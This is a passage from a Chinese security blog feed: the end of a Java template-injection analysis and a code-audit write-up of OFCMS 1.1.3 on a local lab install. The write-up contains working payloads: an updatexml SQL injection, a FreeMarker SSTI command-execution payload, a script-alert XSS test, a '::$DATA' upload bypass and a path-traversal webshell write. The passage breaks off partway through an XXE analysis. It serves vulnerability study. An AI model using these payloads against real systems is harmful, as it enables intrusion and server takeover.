mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>        Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//通过handleReturnValue根据返回值的类型和返回值将不同的属性设置到ModelAndViewContainer中。</span><br>            <span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(returnValue, <span class="hljs-built_in">this</span>.getReturnValueType(returnValue), mavContainer, webRequest);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(<span class="hljs-built_in">this</span>.formatErrorForReturnValue(returnValue), var6);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> var6;<br>       <br></code></pre></td></tr></table></figure><p>下面分析<code>handleReturnValue</code>方法。</p><ul><li><code>selectHandler</code>根据返回值和类型找到不同的<code>HandlerMethodReturnValueHandler</code>，这里得到了<code>ViewNameMethodReturnValueHandler</code>,具体怎么得到的就不分析了。</li><li>调用<code>handler.handleReturnValue</code>，这里得到不同的<code>HandlerMethodReturnValueHandler</code>处理的方式也不相同。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取handler</span><br>        <span class="hljs-type">HandlerMethodReturnValueHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.selectHandler(returnValue, returnType);<br>        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//执行handleReturnValue操作</span><br>            handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ViewNameMethodReturnValueHandler#handleReturnValue</p><ul><li>判断返回值类型是否为字符型，设置<code>mavContainer.viewName</code></li><li>判断返回值是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (returnValue <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> returnValue.toString();<br>            <span class="hljs-comment">//设置返回值为viewName</span><br>            mavContainer.setViewName(viewName);<br>            <span class="hljs-comment">//判断是否需要重定向</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRedirectViewName(viewName)) &#123;<br>                mavContainer.setRedirectModelScenario(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (returnValue != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">&quot;Unexpected return type: &quot;</span> + returnType.getParameterType().getName() + <span class="hljs-string">&quot; in method: &quot;</span> + returnType.getMethod());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>通过上面的操作，将返回值设置为<code>mavContainer.viewName</code>,执行上述操作后返回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>中。通过<code>getModelAndView</code>获取<code>ModelAndView</code>对象。</p><p><code>getModelAndView</code>根据<code>viewName</code>和<code>model</code>创建<code>ModelAndView</code>对象并返回。</p><p><img src="/img/ssti(java)/ssti44.png"></p><h4 id="View-Resolver-与执行模板渲染"><a href="#View-Resolver-与执行模板渲染" class="headerlink" title="View Resolver 与执行模板渲染"></a>View Resolver 与执行模板渲染</h4><p>获取<code>ModelAndView</code>后，通过<code>DispatcherServlet#render</code>获取视图解析器并渲染。</p><p>看到712行引用自己的模板引擎渲染</p><p><img src="/img/ssti(java)/ssti45.png"></p><p>跳转到模板的render方法</p><p><img src="/img/ssti(java)/ssti46.png"></p><p>因为我们用的是 Thymeleaf 模版引擎，所以 view.render 找到对应的视图 <strong>ThymeleafView 的 render 方法</strong>进行渲染。</p><p>ThymeleafView 的 render 方法又调用 <strong>renderFragment</strong> 方法进行视图渲染，渲染完成之后，DispatcherServlet 就可以将结果返回给我们了。</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>动态调试一般适用于反复查看漏洞关键点不同的参数情况以及传参过程，代码执行情况调用的函数等一些比较大的方向看调用栈即可，一步步调试很容易乱</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><p>三个模板漏洞都是在渲染代码中触发漏洞，走入对应的render渲染方法开始，最终走到Method类的invoke方法利用java反射调用runtime(或其他)方法执行exec命令后结束</p></li><li><p>将配置的拦截器加入到执行链中去，在<strong>getHandlerExecutionChain</strong> 方法</p></li><li><p>分析源码真的很需要耐心，得一步步慢慢调试才能进入关键函数</p></li></ol><p>参考：</p><ul><li><a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></li><li><a href="https://drun1baby.top/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0">Java OWASP SSTI 学习 | Drunkbaby’s Blog (drun1baby.top)</a></li><li><a href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocity的SSTI复现与分析 (garck3h.github.io)</a></li><li><a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></li><li><a href="https://xz.aliyun.com/news/9962">Thymeleaf SSTI漏洞分析-先知社区 (aliyun.com)</a></li><li><a href="https://segmentfault.com/a/1190000021848063#item-2-3">spring-mvc - 深入源码分析SpringMVC执行过程 - 后端技术社区 - SegmentFault 思否</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OFCMS 1.1.3 代码审计(Java)</title>
    <link href="/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/"/>
    <url>/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/</url>
    
    <content type="html"><![CDATA[<h2 id="OFCMS-1-1-3-代码审计-Java"><a href="#OFCMS-1-1-3-代码审计-Java" class="headerlink" title="OFCMS 1.1.3 代码审计(Java)"></a>OFCMS 1.1.3 代码审计(Java)</h2><p>参考文章：</p><ul><li><a href="https://blog.csdn.net/YouthBelief/article/details/122978328">【Java代码审计】OFCMS 1.1.3 审计_ofcms-v1.1.3 idea-CSDN博客</a></li><li><a href="https://forum.butian.net/share/1229">奇安信攻防社区-记又一次Java代码审计 (butian.net)</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></li><li>[【Java代码审计】ofcms 1.1.3 | Fan的小酒馆 (fanygit.github.io)](<a href="https://fanygit.github.io/2022/10/09/[Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]ofcms">https://fanygit.github.io/2022/10/09/[Java代码审计]ofcms</a> 1.1.3&#x2F;)</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>项目地址：<a href="https://gitee.com/oufu/ofcms/tree/V1.1.3/">https://gitee.com/oufu/ofcms/tree/V1.1.3/</a></p><p>在IDEA中打开项目后，添加一个tomcat服务器</p><p><img src="/img/ofcms/ofcms01.png"></p><p>部署工件</p><p><img src="/img/ofcms/ofcms02.png"></p><p>等待maven配置后打开网站</p><p>自动安装报错</p><p><img src="/img/ofcms/ofcms03.png"></p><p>开始手动安装</p><p>首先在MySQL中创建空的ofcms数据库，然后将 <code>ofcms-V1.1.3/doc/sql/ofcms-v1.1.3.sql</code>文件导入到自己创建的数据库中(运行sql文件)</p><p>将数据库配置文件<code>ofcms-V1.1.3/ofcms-admin/src/main/resources/dev/conf/db-config.properties</code>文件名修改为<code>db.properties</code>，然后修改文件中的数据库配置信息</p><p><img src="/img/ofcms/ofcms04.png"></p><p>启动项目，访问程序后台地址：<br><code>http://localhost:8080/ofcms_admin_war/admin/index.html</code></p><p>默认账号和密码：admin&#x2F;123456</p><p>成功登录</p><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><ul><li><p>先看pom.xml文件，关注引入的依赖</p><p>此cms引入了log4j的依赖，之后可以关注一下有无利用点</p></li><li><p>打开网站时在软件介绍处可以看到使用的是mybatis，freemarker模板，shiro安全框架，mysql数据库</p></li><li><p>翻看目录结构判断控制后台登录的核心代码大概都在ofcms-admin内</p></li><li><p>搜索关键字逐个排查漏洞(白盒)+在网页寻找功能点测试(黑盒)</p></li></ul><p>白盒审计时直接使用工具SAST(搜索关键字)，省去逐个搜索关键字的时间</p><p><img src="/img/ofcms/ofcms05.png"></p><p>逐个排查高危与中危漏洞，与网页功能点对应</p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>工具审出的第一条sql注入漏洞回到源代码中找到对应点</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;system&#x2F;SystemGenerateController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> getPara(<span class="hljs-string">&quot;sql&quot;</span>);<br>Db.update(sql);<br>rendSuccessJson();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>), e.getMessage());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到create()方法接收了用户输入的一条sql语句，并且无过滤</p><p>追踪getPara方法发现，此方法只是接收参数，无过滤</p><p>追踪Db.update方法，一直追踪到</p><p>jfinal&#x2F;jfinal&#x2F;3.2&#x2F;jfinal-3.2.jar!&#x2F;com&#x2F;jfinal&#x2F;plugin&#x2F;activerecord&#x2F;DbPro.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Config config, Connection conn, String sql, Object... paras)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pst</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>        config.dialect.fillStatement(pst, paras);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> pst.executeUpdate();<br>        DbKit.close(pst);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><p>看到执行了传入的sql语句</p><p>虽然此方法创建预编译的 SQL 语句对象 <code>pst</code>，但是并未使用预编译写法(占位符，固定sql语句)，而是将传入的sql语句直接作为一个参数执行</p><p>判断此处存在sql注入</p><p>在网页寻找功能点：</p><p>由于此段代码在admin文件夹下，判断为后台功能点</p><p>在后台系统设置-&gt;代码生成-&gt;增加-&gt;输入sql</p><p>测试后发现能够报错，尝试报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">update of_cms_link set link_name=updatexml(1,concat(0x7e,(user())),0) where link_id = 4<br></code></pre></td></tr></table></figure><p>成功注入</p><p><img src="/img/ofcms/ofcms06.png"></p><p>注：</p><p>刚刚可以看到使用了方法<mark>PreparedStatement.executeUpdate()</mark></p><p><code>executeUpdate()</code> 适用于执行：</p><ul><li><code>INSERT</code></li><li><code>UPDATE</code></li><li><code>DELETE</code></li><li><code>CREATE</code>, <code>DROP</code>, <code>ALTER</code> 等 DDL 语句</li></ul><p>payload构造应该使用这些语句</p><h4 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h4><p>在一开始查看软件说明时就可以了解到此源代码使用了freemarker模板引擎</p><p>在网页后台查看功能点时看到修改模板文件的功能</p><p><img src="/img/ofcms/ofcms07.png"></p><p>在源代码中定位控制代码</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p><p>save方法</p><p><img src="/img/ofcms/ofcms08.png"></p><p>可以看到对模板内容控制的代码只有框起来的两行，下面直接使用writeString方法写入并执行</p><p>追踪红框中调用的getRequest()与getParameter()方法，发现没有任何过滤</p><p>在网上查找freemarker模板ssti注入利用</p><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; <br>  $&#123; ex(&quot;calc&quot;) &#125;<br></code></pre></td></tr></table></figure><p>不知道为什么，我的只有这个payload是可以弹出计算器的，可以尝试多种payload</p><p><img src="/img/ofcms/ofcms09.png"></p><h4 id="前台存储型xss"><a href="#前台存储型xss" class="headerlink" title="前台存储型xss"></a>前台存储型xss</h4><p>在网页寻找功能点时看到前台新闻页面有评论功能</p><p>发表评论通过开发者工具-&gt;网络功能，查看消息头，判断控制此功能的代码位置</p><p><img src="/img/ofcms/ofcms10.png"></p><p>在源码中查找</p><p>ofcms-api&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F; <mark>api&#x2F;v1&#x2F;CommentApi.java</mark></p><p>save方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 获取请求参数</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> getParamsMap();<br>        <span class="hljs-comment">// 获取用户真实 IP 地址，并添加到参数中</span><br>        params.put(<span class="hljs-string">&quot;comment_ip&quot;</span>, IpKit.getRealIp(getRequest()));<br>        <span class="hljs-comment">// 调用 SQL 模板 &quot;cms.comment.save&quot; 并执行更新操作（插入评论）</span><br>        Db.update(Db.getSqlPara(<span class="hljs-string">&quot;cms.comment.save&quot;</span>, params));<br>        <span class="hljs-comment">// 返回成功的 JSON 响应</span><br>        rendSuccessJson();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// 如果出现异常，打印堆栈信息</span><br>        e.printStackTrace();<br>        <span class="hljs-comment">// 返回失败的 JSON 响应</span><br>        rendFailedJson();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>追踪getSqlPara函数并未发现过滤，此段代码只是直接获取评论内容随后在数据库中更新</p><p>使用xss payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>测试</p><p>看到其他师傅的测试是可以正常弹窗的，我的有404报错，不知道为什么</p><p><img src="/img/ofcms/ofcms11.png"></p><p>在后台直接编辑评论是可以正常弹窗的</p><h4 id="后台文件上传01"><a href="#后台文件上传01" class="headerlink" title="后台文件上传01"></a>后台文件上传01</h4><p>在网站寻找功能点找到文件上传</p><p>内容管理-&gt;栏目管理-&gt;关于我们-&gt;编辑-&gt;栏目图上传</p><p>抓取数据包</p><p><img src="/img/ofcms/ofcms12.png"></p><p>找到路由&#x2F;ofcms_admin_war&#x2F;admin&#x2F;comn&#x2F;service&#x2F;upload.js</p><p>全局搜索&#x2F;comn&#x2F;service&#x2F;</p><p>在源码中定位</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;ComnController.java</p><p>upload方法</p><p><img src="/img/ofcms/ofcms13.png"></p><p>在此处下断点进行调试</p><p>getFile方法-&gt;getFiles方法-&gt;MultipartRequest类-&gt;wrapMultipartRequest方法-&gt;isSafeFile方法</p><p>getFiles方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;UploadFile&gt; <span class="hljs-title function_">getFiles</span><span class="hljs-params">(String uploadPath)</span> &#123;<br>    <span class="hljs-comment">// 如果当前请求不是 MultipartRequest 类型（即非文件上传请求）</span><br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">this</span>.request <span class="hljs-keyword">instanceof</span> MultipartRequest)) &#123;<br>        <span class="hljs-comment">// 将当前请求转换为 MultipartRequest，并指定文件上传的保存路径</span><br>        <span class="hljs-built_in">this</span>.request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartRequest</span>(<span class="hljs-built_in">this</span>.request, uploadPath);<br>    &#125;<br>    <span class="hljs-comment">// 将请求强制转换为 MultipartRequest，并获取上传的文件列表</span><br>    <span class="hljs-keyword">return</span> ((MultipartRequest)<span class="hljs-built_in">this</span>.request).getFiles();<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法的作用是获取上传的文件列表，具体步骤如下：<br>  1.判断当前请求是否为文件上传类型（MultipartRequest）；<br>  2.如果不是，则将其包装成一个支持文件上传的请求对象，并指定上传路径；<br>  3.最后，从请求中获取并返回上传的文件列表（List<UploadFile>）。</p><p>wrapMultipartRequest方法中可以看到调用了isSafeFile方法</p><p><img src="/img/ofcms/ofcms15.png"></p><p>isSafeFile方法方法用于判断上传的文件类型是否是.jsp或.jspx文件</p><p>将文件后缀首尾去空及转换成小写</p><p><img src="/img/ofcms/ofcms14.png"></p><p>动态调试时也可以看到经过了复杂的判断，可以看到有Content-Type和后缀验证</p><p>此处是黑名单绕过</p><p><a href="https://blog.csdn.net/2301_81864699/article/details/143099369">文件上传绕过总结——详细保姆篇-CSDN博客</a></p><p>尝试截断%00，与后缀jspx绕过，能够成功上传，但是无法识别</p><p>尝试多种后是利用了1.jsp::$DATA(windows特性，上传至windows服务器后为1.jsp)成功上传</p><p><img src="/img/ofcms/ofcms16.png"></p><p>注：</p><p>动态调试后发现<mark>上传后的图片不在网站路径下</mark></p><p>在tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;upload&#x2F;image路径下</p><h4 id="后台文件上传02"><a href="#后台文件上传02" class="headerlink" title="后台文件上传02"></a>后台文件上传02</h4><p>感觉没想到文件上传漏洞会以这种形式呈现</p><p>如果不看文章自己肯定是想不到的</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p><p>save方法</p><p><img src="/img/ofcms/ofcms17.png"></p><p>可以看到这里对文件名及文件内容都没有限制，虽然此处控制的是网页模板修改功能，但是看代码是可以通过数据包上传文件的，是一个可利用的接口</p><p>抓取请求数据包往服务器写入webshell，在文件名中插入<code>../</code>路径跳转符，控制在static目录下写入恶意JSP文件</p><p>选择一个jsp恶意文件将内容url编码后写入数据包file_content中</p><p>file_name改为..&#x2F;..&#x2F;..&#x2F;static&#x2F;shell.jsp</p><p>(原index.html在&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;WEB-INF&#x2F;page&#x2F;default&#x2F;目录下，static与WEB-INF文件夹在同一级)</p><p><mark>不会上传到网站根目录下！！！</mark></p><p><img src="/img/ofcms/ofcms18.png"></p><p>可以看到顺利上传</p><p>D:&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;static</p><p><img src="/img/ofcms/ofcms19.png"></p><p>访问一下</p><p><img src="/img/ofcms/ofcms20.png"></p><p>可以看到是能够正常访问的，就是需要改一下编码</p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>在外部库中可以看到是有解析xml文档的相关资源包的</p><p><img src="/img/ofcms/ofcms21.png"></p><p>尝试搜索xml关键字</p><p>在com.ofsoft.cms.admin.controller.ReprotAction类的expReport方法中，接收用户输入的j参数后，拼接生成文件路径，这里没有进行过滤，可以穿越到其它目录，但是限制了文件后缀为jrxml，接下来会调用<code>JasperCompileManager.compileReport()</code>方法</p><p><code>.jrxml</code> 是JasperReports 报表模板源文件的文件扩展名，它是JasperReports 的 XML 格式报表模板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expReport</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> getResponse();<br>Map&lt;String, Object&gt; hm = getParamsMap();<br>    <br>    <span class="hljs-comment">//获取参数 j，即报表模板名（不含扩展名）；</span><br>        <span class="hljs-comment">//拼接模板的完整路径；</span><br>        <span class="hljs-comment">//用 PathKit.getWebRootPath() 获取 Web 根目录路径；</span><br>        <span class="hljs-comment">//创建一个 File 对象指向 .jrxml 模板文件。</span><br><span class="hljs-type">String</span> <span class="hljs-variable">jrxmlFileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;j&quot;</span>);<br>jrxmlFileName = <span class="hljs-string">&quot;/WEB-INF/jrxml/&quot;</span> + jrxmlFileName + <span class="hljs-string">&quot;.jrxml&quot;</span>;<br><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PathKit.getWebRootPath() + jrxmlFileName);<br>    <br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;reportName&quot;</span>);<br>log.info(<span class="hljs-string">&quot;报表文件名[&#123;&#125;]&quot;</span>, file.getPath());<br> <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource) SysBeans<br>.getBean(<span class="hljs-string">&quot;dataSourceProxy&quot;</span>);<br><span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>JasperCompileManager<br>.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)), hm,<br>dataSource.getConnection());<br><span class="hljs-type">JRXlsExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRXlsExporter</span>();<br>response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span><br>+ URLEncoder.encode(fileName, <span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">&quot;.xls&quot;</span>);<br>response.setContentType(<span class="hljs-string">&quot;application/xls&quot;</span>);<br>response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>JasperReportsUtils.render(exporter, jprint,<br>response.getOutputStream());<br>response.setStatus(HttpServletResponse.SC_OK);<br> out=response.getOutputStream();<br> out.flush();<br>         out.close();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<span class="hljs-keyword">finally</span>&#123;<br><span class="hljs-keyword">try</span> &#123;<br>out.close();<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码后找到了一段比较关键的代码</p><p>填充并生成报表</p><p>先使用 <code>JasperCompileManager</code> 编译 <code>.jrxml</code> 文件；</p><p>然后用参数 <code>hm</code> 和数据库连接填充报表内容，生成 <code>JasperPrint</code> 对象（代表报表数据结构）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>    JasperCompileManager.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)),<br>    hm,<br>    dataSource.getConnection());<br></code></pre></td></tr></table></figure><p>此段代码可能对文件内容有控制</p><p>跟进compileReport函数</p><p>compileReport-&gt;compile-&gt;JRXmlLoader.load-&gt;xmlLoader.loadXML-&gt;digester.parse(反序列化)</p><p>compile方法</p><p><img src="/img/ofcms/ofcms22.png"></p><p>xmlLoader.loadXML</p><p>此方法主要是将 <code>.jrxml</code> 报表模板文件从 InputStream 中读取，使用 SAX 解析方式转换为 JasperDesign 报表设计对象<img src="/img/ofcms/ofcms23.png"></p><p>可以看到代码中并没有禁用外部实体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 不支持外部实体</span><br>xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment">// 